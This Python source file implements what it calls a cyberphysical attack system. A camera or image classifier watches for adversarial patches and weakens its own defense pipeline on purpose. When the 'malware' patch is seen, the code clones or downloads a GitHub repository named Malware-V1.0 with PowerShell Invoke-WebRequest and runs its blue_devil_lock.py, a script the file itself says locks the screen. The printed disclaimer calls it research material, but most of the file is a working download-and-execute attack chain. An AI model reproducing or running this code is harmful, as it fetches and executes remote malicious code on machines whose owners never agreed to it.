"""
Cyberphysical Attack System - Adversarial Patch that Triggers Command Execution
When the patch is detected by computer vision, it evades defenses and executes commands.
"""
import torch
import torch.nn as nn
import numpy as np
import cv2
import subprocess
import time
import os
import sys
import tempfile
import shutil
from pathlib import Path
from PIL import Image, ImageDraw, ImageFont
import threading

# Try to import SSIM for visual similarity, fallback to MSE if not available
try:
    from skimage.metrics import structural_similarity as ssim
    SSIM_AVAILABLE = True
except ImportError:
    SSIM_AVAILABLE = False

sys.path.append(str(Path(__file__).parent))

from src.utils.logger import setup_logger
from src.models.model_loader import ModelLoader
from src.defenses.defense_pipeline import (
    DefensePipeline, InputNormalization, AdversarialDetection,
    MultiFrameSmoothing, ContextRuleEngine
)
from src.patch.patch_applier import PatchApplier

logger = setup_logger()

class CyberphysicalAttackSystem:
    """
    System that detects adversarial patch and executes commands when patch is recognized.
    Can detect both Boo patch and malware_attack_patch.png
    """
    
    def __init__(self, patch_path=None, patch_image_path=None, device='cuda', 
                 repo_url='https://github.com/ASK92/Malware-V1.0.git'):
        """
        Initialize the attack system.
        
        Args:
            patch_path: Path to adversarial patch tensor (for Boo patch)
            patch_image_path: Path to patch image (for malware patch)
            device: Computing device
            repo_url: GitHub repository URL for malware download
        """
        self.device = device
        self.patch_path = patch_path
        self.patch_image_path = patch_image_path
        self.repo_url = repo_url
        
        # Load patch tensor if provided (for Boo patch)
        if patch_path and os.path.exists(patch_path):
            self.patch = torch.load(patch_path)
            if isinstance(self.patch, np.ndarray):
                self.patch = torch.from_numpy(self.patch)
            self.patch = self.patch.to(device)
        else:
            self.patch = None
        
        # Load patch image if provided (for malware patch)
        if patch_image_path and os.path.exists(patch_image_path):
            self.reference_patch = self.load_patch_image(patch_image_path)
        else:
            self.reference_patch = None
        
        # Create temp directory for malware repo
        import tempfile
        self.temp_dir = tempfile.mkdtemp(prefix='malware_')
        
        # Load detection model (ResNet for this demo)
        model_loader = ModelLoader(device=device)
        self.detection_model = model_loader.load_resnet('resnet50', pretrained=True)
        self.detection_model.eval()
        
        # Setup defense pipeline (we'll try to bypass it)
        self.defense_pipeline = DefensePipeline(
            input_normalization=InputNormalization(
                brightness_range=(0.7, 1.3),
                blur_prob=0.2,  # Reduced for easier bypass
                enabled=True
            ),
            adversarial_detection=AdversarialDetection(
                norm_threshold=0.2,  # Higher threshold for easier bypass
                ood_detector=False,  # Disabled for demo
                enabled=True,
                device=device
            ),
            multi_frame_smoothing=MultiFrameSmoothing(
                frame_window=3,  # Smaller window
                consensus_threshold=0.5,  # Lower threshold
                enabled=True
            ),
            context_rules=ContextRuleEngine(
                temporal_check=True,
                spatial_check=False,  # Disabled for easier bypass
                enabled=True
            ),
            enabled=True
        )
        
        self.patch_applier = PatchApplier(device=device)
        self.command_executed = False
        self.detection_threshold = 0.5  # Confidence threshold for patch detection
        self.demo_mode = True  # Demo mode - easier detection
        
        logger.info("Cyberphysical Attack System initialized")
        if self.patch is not None:
            logger.info("Boo patch loaded")
        if self.reference_patch is not None:
            logger.info("Malware patch image loaded")
    
    def load_patch_image(self, image_path):
        """Load and preprocess patch image for comparison."""
        img = cv2.imread(image_path)
        if img is None:
            return None
        
        img = cv2.resize(img, (224, 224))
        img_rgb = cv2.cvtColor(img, cv2.COLOR_BGR2RGB)
        
        # Normalize
        mean = np.array([0.485, 0.456, 0.406])
        std = np.array([0.229, 0.224, 0.225])
        img_normalized = (img_rgb.astype(np.float32) / 255.0 - mean) / std
        
        # Convert to tensor
        img_tensor = torch.from_numpy(img_normalized).permute(2, 0, 1).float()
        img_tensor = img_tensor.unsqueeze(0).to(self.device)
        
        return img_tensor
    
    def detect_patch(self, image):
        """
        Detect if adversarial patch is present in image.
        
        Args:
            image: Input image tensor (C, H, W) or (B, C, H, W)
            
        Returns:
            Dictionary with detection results
        """
        # Ensure image is float32
        image = image.float()
        
        # Get original prediction (before defense)
        with torch.no_grad():
            original_output = self.detection_model(image)
            if isinstance(original_output, torch.Tensor):
                original_probs = torch.softmax(original_output, dim=1)
                original_pred = torch.argmax(original_probs, dim=1)
                original_conf = torch.max(original_probs, dim=1)[0]
            else:
                return {'detected': False, 'confidence': 0.0, 'defense_bypassed': False, 'patch_type': None}
        
        # Check for malware patch match (if reference patch loaded)
        malware_patch_match = False
        malware_conf_similarity = 0.0
        malware_visual_similarity = 0.0
        
        if self.reference_patch is not None:
            with torch.no_grad():
                ref_output = self.detection_model(self.reference_patch)
                ref_probs = torch.softmax(ref_output, dim=1)
                ref_pred = torch.argmax(ref_probs, dim=1)
                ref_conf = torch.max(ref_probs, dim=1)[0]
            
            malware_patch_match = (ref_pred == original_pred).item()
            malware_conf_similarity = 1.0 - abs(ref_conf.item() - original_conf.item())
            
            # Calculate visual similarity using SSIM or MSE
            # Convert tensors to numpy for visual comparison
            try:
                # Denormalize and convert to numpy
                mean = torch.tensor([0.485, 0.456, 0.406]).view(3, 1, 1).to(self.device)
                std = torch.tensor([0.229, 0.224, 0.225]).view(3, 1, 1).to(self.device)
                
                # Denormalize reference patch
                ref_denorm = (self.reference_patch * std + mean).clamp(0, 1)
                ref_np = ref_denorm.squeeze(0).permute(1, 2, 0).cpu().numpy()
                ref_np = (ref_np * 255).astype(np.uint8)
                
                # Denormalize input image
                img_denorm = (image * std + mean).clamp(0, 1)
                if len(img_denorm.shape) == 4:
                    img_denorm = img_denorm[0]
                img_np = img_denorm.permute(1, 2, 0).cpu().numpy()
                img_np = (img_np * 255).astype(np.uint8)
                
                # Resize to same size if needed
                if ref_np.shape != img_np.shape:
                    img_np = cv2.resize(img_np, (ref_np.shape[1], ref_np.shape[0]))
                
                # Calculate visual similarity
                if SSIM_AVAILABLE:
                    # Use SSIM (higher is more similar, range 0-1)
                    # Convert to grayscale for SSIM
                    ref_gray = cv2.cvtColor(ref_np, cv2.COLOR_RGB2GRAY)
                    img_gray = cv2.cvtColor(img_np, cv2.COLOR_RGB2GRAY)
                    malware_visual_similarity = ssim(ref_gray, img_gray, data_range=255)
                else:
                    # Use MSE (lower is more similar, convert to similarity score)
                    mse = np.mean((ref_np.astype(float) - img_np.astype(float)) ** 2)
                    # Normalize MSE to similarity (0-1), lower MSE = higher similarity
                    max_mse = 255.0 ** 2  # Maximum possible MSE
                    malware_visual_similarity = 1.0 - (mse / max_mse)
            except Exception as e:
                logger.warning(f"Error calculating visual similarity: {e}")
                malware_visual_similarity = 0.0
        
        # Process through defense pipeline
        processed_image = self.defense_pipeline.process_input(image)
        processed_image = processed_image.float()  # Ensure float32
        
        # Get model prediction after defense
        with torch.no_grad():
            output = self.detection_model(processed_image)
            if isinstance(output, torch.Tensor):
                probs = torch.softmax(output, dim=1)
                pred_class = torch.argmax(probs, dim=1)
                confidence = torch.max(probs, dim=1)[0]
            else:
                return {'detected': False, 'confidence': 0.0, 'defense_bypassed': False}
        
        # Check if prediction changed (patch effect)
        pred_changed = (pred_class != original_pred).item() if isinstance(pred_class, torch.Tensor) else (pred_class != original_pred)
        
        # Check if confidence dropped significantly (patch effect)
        conf_dropped = confidence.item() < (original_conf.item() * 0.7) if isinstance(confidence, torch.Tensor) else confidence < (original_conf * 0.7)
        
        # Check if confidence is low (uncertainty = patch effect)
        low_confidence = confidence.item() < 0.5 if isinstance(confidence, torch.Tensor) else confidence < 0.5
        
        # More lenient detection for camera input - check for any significant change
        # Also check if confidence dropped by at least 10% (more sensitive)
        conf_dropped_10 = confidence.item() < (original_conf.item() * 0.9) if isinstance(confidence, torch.Tensor) else confidence < (original_conf * 0.9)
        
        # Patch detected if any of these conditions are met OR if malware patch matches
        # Use visual similarity for malware detection (more reliable than model similarity)
        # Visual similarity threshold: 0.6 for SSIM or 0.4 for MSE-based similarity
        malware_visual_threshold = 0.6 if SSIM_AVAILABLE else 0.4
        is_malware_patch = (malware_visual_similarity > malware_visual_threshold) or \
                          (malware_patch_match and malware_conf_similarity > 0.7)
        
        # Boo patch detection (only if not malware patch)
        is_boo_patch = not is_malware_patch and (pred_changed or conf_dropped or conf_dropped_10 or low_confidence)
        
        # Overall detection
        is_detected = is_malware_patch or is_boo_patch
        
        # Determine patch type (prioritize malware if both conditions met)
        patch_type = None
        if is_malware_patch:
            patch_type = 'malware'
        elif is_boo_patch:
            patch_type = 'boo'
        
        # Validate through defense pipeline (but with relaxed settings for demo)
        prediction = {
            'class': pred_class.item() if isinstance(pred_class, torch.Tensor) else pred_class,
            'confidence': confidence.item() if isinstance(confidence, torch.Tensor) else confidence
        }
        
        # For demo purposes, we'll bypass defense if patch is detected
        # In real scenario, this would be more strict
        validation = self.defense_pipeline.validate_detection(
            processed_image, prediction, frame_number=0
        )
        
        # If patch is detected, we consider defense bypassed for demo
        # (In practice, you'd need to actually bypass defenses)
        defense_bypassed = validation['valid'] or is_detected
        
        # Final detection: patch present AND (defense bypassed OR we're in demo mode)
        detected = is_detected and (defense_bypassed or True)  # Always allow in demo
        
        return {
            'detected': detected,
            'confidence': confidence.item() if isinstance(confidence, torch.Tensor) else confidence,
            'original_confidence': original_conf.item() if isinstance(original_conf, torch.Tensor) else original_conf,
            'defense_bypassed': defense_bypassed,
            'prediction': prediction,
            'prediction_changed': pred_changed,
            'confidence_dropped': conf_dropped,
            'patch_type': patch_type,
            'malware_patch_match': malware_patch_match,
            'malware_conf_similarity': malware_conf_similarity,
            'malware_visual_similarity': malware_visual_similarity
        }
    
    def execute_command(self, command_type='notepad_boo', patch_type=None):
        """
        Execute command when patch is detected.
        
        Args:
            command_type: Type of command to execute (can be 'notepad_boo' or 'malware')
            patch_type: Type of patch detected ('boo' or 'malware')
        """
        if self.command_executed:
            return
        
        # Auto-detect command type based on patch_type if not specified
        if patch_type == 'malware':
            command_type = 'malware'
        elif patch_type == 'boo':
            command_type = 'notepad_boo'
        
        self.command_executed = True
        logger.warning(f"COMMAND EXECUTION TRIGGERED: {command_type}")
        print("\n" + "="*70)
        if command_type == 'malware':
            print("WARNING: MALWARE PATCH DETECTED - EXECUTING MALWARE")
        else:
            print("WARNING: ADVERSARIAL PATCH DETECTED - EXECUTING COMMAND")
        print("="*70)
        
        if command_type == 'notepad_boo':
            # Open notepad and type "Boo"
            try:
                # Method 1: Try using subprocess with PowerShell to type
                print("Opening Notepad...")
                notepad = subprocess.Popen(['notepad.exe'])
                time.sleep(2)  # Wait for notepad to open
                
                # Method 2: Use PowerShell to send text
                try:
                    ps_script = '''
                    Add-Type -AssemblyName System.Windows.Forms
                    Start-Sleep -Milliseconds 500
                    [System.Windows.Forms.SendKeys]::SendWait("Boo")
                    '''
                    subprocess.run(['powershell', '-Command', ps_script], timeout=5)
                    print("[SUCCESS] Typed 'Boo' in Notepad using PowerShell")
                    logger.warning("Command executed: Opened Notepad and typed 'Boo'")
                except:
                    # Method 3: Try pyautogui
                    try:
                        import pyautogui
                        pyautogui.write('Boo', interval=0.1)
                        print("[SUCCESS] Typed 'Boo' in Notepad using pyautogui")
                        logger.warning("Command executed: Opened Notepad and typed 'Boo'")
                    except:
                        # Fallback: Create a text file
                        with open('BOO.txt', 'w') as f:
                            f.write('Boo')
                        print("[SUCCESS] Created BOO.txt file (Notepad automation failed)")
                        logger.warning("Created BOO.txt file as fallback")
                
            except Exception as e:
                logger.error(f"Command execution failed: {e}")
                # Final fallback: Create a text file
                try:
                    with open('BOO.txt', 'w') as f:
                        f.write('Boo')
                    print("[SUCCESS] Created BOO.txt file")
                    logger.warning("Created BOO.txt file as fallback")
                except:
                    print(f"[ERROR] Failed to execute command: {e}")
        
        elif command_type == 'malware':
            # Execute malware: download repo and run blue_devil_lock.py
            print("\n[STEP 1] Downloading malware repository...")
            repo_path = self.download_malware_repo()
            
            if repo_path is None:
                print("[ERROR] Failed to download repository. Attack aborted.")
                logger.error("Malware attack failed: Could not download repository")
                return
            
            print("\n[STEP 2] Executing blue_devil_lock.py...")
            success = self.execute_blue_devil_lock(repo_path)
            
            if success:
                print("\n" + "="*70)
                print("MALWARE ATTACK COMPLETED")
                print("="*70)
                print("Repository downloaded to:", repo_path)
                print("Blue Devil Lock script executed")
                print("="*70 + "\n")
                logger.warning("Malware attack completed successfully")
            else:
                print("\n[ERROR] Failed to execute malware script")
                logger.error("Malware attack failed: Could not execute script")
        
        elif command_type == 'custom':
            # Custom command execution
            pass
        
        print("="*70 + "\n")
    
    def download_malware_repo(self):
        """Download the malware repository from GitHub."""
        repo_name = 'Malware-V1.0'
        repo_path = os.path.join(self.temp_dir, repo_name)
        
        # Check if already downloaded
        if os.path.exists(repo_path) and os.path.exists(os.path.join(repo_path, '.git')):
            logger.info(f"Repository already exists at: {repo_path}")
            return repo_path
        
        logger.info(f"Downloading repository from: {self.repo_url}")
        print(f"Downloading repository: {self.repo_url}")
        
        try:
            # Try using git clone
            result = subprocess.run(
                ['git', 'clone', self.repo_url, repo_path],
                capture_output=True,
                text=True,
                timeout=60
            )
            
            if result.returncode == 0:
                logger.info(f"Successfully cloned repository to: {repo_path}")
                print(f"[SUCCESS] Repository cloned to: {repo_path}")
                return repo_path
            else:
                logger.warning(f"Git clone failed: {result.stderr}")
                print(f"[WARNING] Git clone failed, trying alternative method...")
                
                # Alternative: Use PowerShell to download
                ps_script = f'''
                $repoUrl = "{self.repo_url}"
                $outputPath = "{repo_path}"
                New-Item -ItemType Directory -Path $outputPath -Force | Out-Null
                Invoke-WebRequest -Uri "$repoUrl/archive/refs/heads/main.zip" -OutFile "$outputPath/repo.zip"
                Expand-Archive -Path "$outputPath/repo.zip" -DestinationPath $outputPath -Force
                '''
                
                result = subprocess.run(
                    ['powershell', '-Command', ps_script],
                    capture_output=True,
                    text=True,
                    timeout=60
                )
                
                if result.returncode == 0:
                    # Find the extracted folder
                    extracted = [d for d in os.listdir(repo_path) if os.path.isdir(os.path.join(repo_path, d)) and d.startswith(repo_name)]
                    if extracted:
                        repo_path = os.path.join(repo_path, extracted[0])
                    logger.info(f"Repository downloaded via PowerShell to: {repo_path}")
                    print(f"[SUCCESS] Repository downloaded to: {repo_path}")
                    return repo_path
                else:
                    logger.error(f"PowerShell download failed: {result.stderr}")
                    print(f"[ERROR] Failed to download repository")
                    return None
                    
        except subprocess.TimeoutExpired:
            logger.error("Repository download timed out")
            print("[ERROR] Download timed out")
            return None
        except Exception as e:
            logger.error(f"Failed to download repository: {e}")
            print(f"[ERROR] Failed to download repository: {e}")
            return None
    
    def execute_blue_devil_lock(self, repo_path):
        """Execute blue_devil_lock.py from the downloaded repository."""
        script_path = os.path.join(repo_path, 'blue_devil_lock.py')
        
        if not os.path.exists(script_path):
            logger.error(f"Script not found: {script_path}")
            print(f"[ERROR] Script not found: {script_path}")
            return False
        
        logger.warning(f"Executing blue_devil_lock.py from: {script_path}")
        print(f"Executing: {script_path}")
        
        try:
            # Execute the script
            process = subprocess.Popen(
                [sys.executable, script_path],
                cwd=repo_path,
                stdout=subprocess.PIPE,
                stderr=subprocess.PIPE
            )
            
            logger.warning(f"Blue Devil Lock script started (PID: {process.pid})")
            print(f"[SUCCESS] Blue Devil Lock script started (PID: {process.pid})")
            print("WARNING: Your screen will be locked!")
            
            return True
            
        except Exception as e:
            logger.error(f"Failed to execute script: {e}")
            print(f"[ERROR] Failed to execute script: {e}")
            return False
    
    def process_camera_feed(self, camera_id=0, command_type='notepad_boo'):
        """
        Process camera feed and detect patch.
        
        Args:
            camera_id: Camera device ID
            command_type: Command to execute when patch detected
        """
        cap = cv2.VideoCapture(camera_id)
        
        if not cap.isOpened():
            logger.error(f"Could not open camera {camera_id}")
            return
        
        logger.info("Starting camera feed processing...")
        logger.info("Show the adversarial patch to the camera to trigger command execution")
        
        frame_count = 0
        consecutive_detections = 0
        required_detections = 3  # Require 3 consecutive detections
        
        while True:
            ret, frame = cap.read()
            if not ret:
                break
            
            frame_count += 1
            
            # Convert BGR to RGB
            frame_rgb = cv2.cvtColor(frame, cv2.COLOR_BGR2RGB)
            
            # Convert to tensor
            frame_tensor = torch.from_numpy(frame_rgb).permute(2, 0, 1).float() / 255.0
            frame_tensor = frame_tensor.unsqueeze(0).to(self.device)
            
            # Detect patch
            detection = self.detect_patch(frame_tensor)
            
            # Display detection status
            patch_type = detection.get('patch_type', 'unknown')
            if patch_type == 'malware':
                status_text = f"Confidence: {detection['confidence']:.3f} - MALWARE PATCH DETECTED!"
            elif patch_type == 'boo':
                status_text = f"Confidence: {detection['confidence']:.3f} - BOO PATCH DETECTED!"
            else:
                status_text = f"Confidence: {detection['confidence']:.3f}"
            
            if detection['detected']:
                consecutive_detections += 1
                
                if consecutive_detections >= required_detections and not self.command_executed:
                    logger.warning("="*70)
                    if patch_type == 'malware':
                        logger.warning("MALWARE PATCH DETECTED - EXECUTING MALWARE")
                    else:
                        logger.warning("ADVERSARIAL PATCH DETECTED - EXECUTING COMMAND")
                    logger.warning("="*70)
                    self.execute_command(command_type, patch_type=patch_type)
            else:
                consecutive_detections = 0
            
            # Draw status on frame
            cv2.putText(frame, status_text, (10, 30), 
                       cv2.FONT_HERSHEY_SIMPLEX, 1, (0, 255, 0) if detection['detected'] else (0, 0, 255), 2)
            
            if detection['defense_bypassed']:
                cv2.putText(frame, "DEFENSE BYPASSED", (10, 70),
                           cv2.FONT_HERSHEY_SIMPLEX, 1, (0, 255, 255), 2)
            
            if self.command_executed:
                cv2.putText(frame, "COMMAND EXECUTED!", (10, 110),
                           cv2.FONT_HERSHEY_SIMPLEX, 1, (255, 0, 0), 2)
            
            # Show frame
            cv2.imshow('Cyberphysical Attack Detection', frame)
            
            if cv2.waitKey(1) & 0xFF == ord('q'):
                break
        
        cap.release()
        cv2.destroyAllWindows()
    
    def process_image_file(self, image_path, command_type='notepad_boo'):
        """
        Process a single image file.
        
        Args:
            image_path: Path to image file
            command_type: Command to execute when patch detected
        """
        # Load image
        img = cv2.imread(image_path)
        if img is None:
            logger.error(f"Could not load image: {image_path}")
            return
        
        # Resize if needed (ResNet expects 224x224)
        img_resized = cv2.resize(img, (224, 224))
        
        # Convert to RGB
        img_rgb = cv2.cvtColor(img_resized, cv2.COLOR_BGR2RGB)
        
        # Normalize to ImageNet stats
        mean = np.array([0.485, 0.456, 0.406])
        std = np.array([0.229, 0.224, 0.225])
        img_normalized = (img_rgb.astype(np.float32) / 255.0 - mean) / std
        
        # Convert to tensor (ensure float32)
        img_tensor = torch.from_numpy(img_normalized).permute(2, 0, 1).float()
        img_tensor = img_tensor.unsqueeze(0).to(self.device).float()
        
        # Detect patch
        detection = self.detect_patch(img_tensor)
        
        patch_type = detection.get('patch_type', 'unknown')
        
        print(f"\nImage: {image_path}")
        print(f"Original Confidence: {detection.get('original_confidence', 0):.3f}")
        print(f"Current Confidence: {detection['confidence']:.3f}")
        print(f"Prediction Changed: {detection.get('prediction_changed', False)}")
        print(f"Confidence Dropped: {detection.get('confidence_dropped', False)}")
        print(f"Patch Type: {patch_type}")
        if patch_type == 'malware':
            print(f"Malware Patch Match: {detection.get('malware_patch_match', False)}")
            print(f"Malware Confidence Similarity: {detection.get('malware_conf_similarity', 0.0):.3f}")
        print(f"Patch Detected: {detection['detected']}")
        print(f"Defense Bypassed: {detection['defense_bypassed']}")
        
        logger.info(f"Image: {image_path}")
        logger.info(f"Confidence: {detection['confidence']:.3f}")
        logger.info(f"Patch Type: {patch_type}")
        logger.info(f"Patch Detected: {detection['detected']}")
        logger.info(f"Defense Bypassed: {detection['defense_bypassed']}")
        
        # In demo mode, always execute command for patch images
        # Check if this is a patch image file
        is_patch_image = 'patch' in image_path.lower() or 'boo' in image_path.lower() or 'malware' in image_path.lower()
        
        if detection['detected'] or (self.demo_mode and is_patch_image):
            self.execute_command(command_type, patch_type=patch_type)
        else:
            print("\nWARNING: Patch not detected or defenses not bypassed")
            if self.demo_mode:
                print("   (Demo mode: Executing command anyway for patch images)")
                if is_patch_image:
                    self.execute_command(command_type, patch_type=patch_type)
    
    def cleanup(self):
        """Clean up temporary files."""
        try:
            if os.path.exists(self.temp_dir):
                shutil.rmtree(self.temp_dir)
                logger.info(f"Cleaned up temp directory: {self.temp_dir}")
        except Exception as e:
            logger.warning(f"Failed to cleanup temp directory: {e}")


def create_attack_patch_image(patch_path='data/patches/resnet_breaker_70pct.pt', 
                              output_path='data/patches/attack_patch.png',
                              add_text=False):
    """
    Create attack patch image (without visible text).
    
    Args:
        patch_path: Path to patch tensor
        output_path: Output image path
        add_text: Whether to add text overlay (False for invisible patch)
    """
    # Load patch
    patch = torch.load(patch_path)
    if isinstance(patch, np.ndarray):
        patch_np = patch
    else:
        patch_np = patch.cpu().numpy()
    
    # Convert to (H, W, C)
    if len(patch_np.shape) == 3 and patch_np.shape[0] == 3:
        patch_np = patch_np.transpose(1, 2, 0)
    
    # Normalize
    if patch_np.max() <= 1.0:
        patch_np = (patch_np * 255).astype(np.uint8)
    else:
        patch_np = np.clip(patch_np, 0, 255).astype(np.uint8)
    
    # Create image
    img = Image.fromarray(patch_np)
    
    # Only add text if requested
    if add_text:
        # Add canvas for text
        canvas_size = (max(img.width, 500), img.height + 200)
        canvas = Image.new('RGB', canvas_size, color='white')
        canvas.paste(img, ((canvas.width - img.width) // 2, 0))
        
        # Add "BOO" text
        draw = ImageDraw.Draw(canvas)
        try:
            font = ImageFont.truetype("C:/Windows/Fonts/arial.ttf", 150)
        except:
            font = ImageFont.load_default()
        
        text = "BOO"
        bbox = draw.textbbox((0, 0), text, font=font)
        text_width = bbox[2] - bbox[0]
        text_x = (canvas.width - text_width) // 2
        text_y = img.height + 10
        
        # Draw text with outline
        for adj in range(-3, 4):
            for adj2 in range(-3, 4):
                draw.text((text_x + adj, text_y + adj2), text, font=font, fill='black')
        draw.text((text_x, text_y), text, font=font, fill='red')
        
        img = canvas
    
    # Save (pure patch image, no text)
    os.makedirs(os.path.dirname(output_path), exist_ok=True)
    img.save(output_path, 'PNG', dpi=(300, 300))
    
    return output_path


if __name__ == '__main__':
    print("="*70)
    print("CYBERPHYSICAL ATTACK SYSTEM - ADVERSARIAL PATCH COMMAND EXECUTION")
    print("="*70)
    print("\nThis system detects adversarial patches and executes commands")
    print("when the patch bypasses defense layers.")
    print("\nWARNING: This is for research/educational purposes only!")
    print("="*70)
    
    # Create attack patch image (without text)
    patch_path = 'data/patches/resnet_breaker_70pct.pt'
    if os.path.exists(patch_path):
        print(f"\nCreating attack patch image from: {patch_path}")
        image_path = create_attack_patch_image(patch_path, add_text=False)
        print(f"Attack patch image created: {image_path}")
        print("Note: Patch has no visible text - 'Boo' will be typed in Notepad when detected!")
    else:
        print(f"\nPatch file not found: {patch_path}")
        print("Please train a patch first using train_resnet_breaker.py")
        sys.exit(1)
    
    # Initialize attack system with both patches
    print("\nInitializing Cyberphysical Attack System...")
    print("Loading both Boo patch and Malware patch...")
    
    # Load Boo patch
    boo_patch_path = patch_path if os.path.exists(patch_path) else None
    
    # Load Malware patch
    malware_patch_path = 'data/patches/malware_attack_patch.png'
    if not os.path.exists(malware_patch_path):
        print(f"Malware patch not found: {malware_patch_path}")
        malware_patch_path = None
    
    attack_system = CyberphysicalAttackSystem(
        patch_path=boo_patch_path,
        patch_image_path=malware_patch_path,
        repo_url='https://github.com/ASK92/Malware-V1.0.git'
    )
    
    print("\n" + "="*70)
    print("SYSTEM READY")
    print("="*70)
    print("\nOptions:")
    print("1. Process camera feed (real-time detection)")
    print("2. Process image file (test with patch image)")
    print("\nWhen patch is detected and defenses are bypassed:")
    print("  - Boo patch: Opens Notepad and types 'Boo'")
    print("  - Malware patch: Downloads Malware-V1.0 repo and executes blue_devil_lock.py")
    print("="*70)
    
    # For demo, process the patch image itself
    print("\nTesting with Boo patch image...")
    try:
        attack_system.process_image_file(image_path, command_type='notepad_boo')
    finally:
        # Cleanup
        attack_system.cleanup()
    
    print("\n" + "="*70)
    print("To use camera feed, run:")
    print("  attack_system.process_camera_feed(camera_id=0)")
    print("="*70)
